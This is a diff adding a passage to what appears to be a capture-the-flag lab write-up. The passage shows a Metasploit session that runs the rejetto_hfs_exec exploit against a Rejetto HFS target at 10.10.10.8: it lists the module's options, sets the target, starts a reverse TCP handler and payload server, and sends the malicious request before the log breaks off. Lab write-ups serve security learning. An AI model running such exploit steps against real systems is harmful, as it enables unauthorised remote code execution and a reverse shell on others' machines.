@@ -58,7 +58,45 @@ I used the `exploit/windows/http/rejetto_hfs_exec`as the exploit.
 msf > use exploit/windows/http/rejetto_hfs_exec
 ```
 
+```
+msf exploit(rejetto_hfs_exec) > show options
 
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                       yes       The target address
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(rejetto_hfs_exec) > set RHOST 10.10.10.8
+RHOST => 10.10.10.8
+msf exploit(rejetto_hfs_exec) > 
+msf exploit(rejetto_hfs_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] Using URL: http://0.0.0.0:8080/IrcKe8v9
+[*] Local IP: http://10.0.0.69:8080/IrcKe8v9
+[*] Server started.
+[*] Sending a malicious request to /
+...
+```
 
 
 
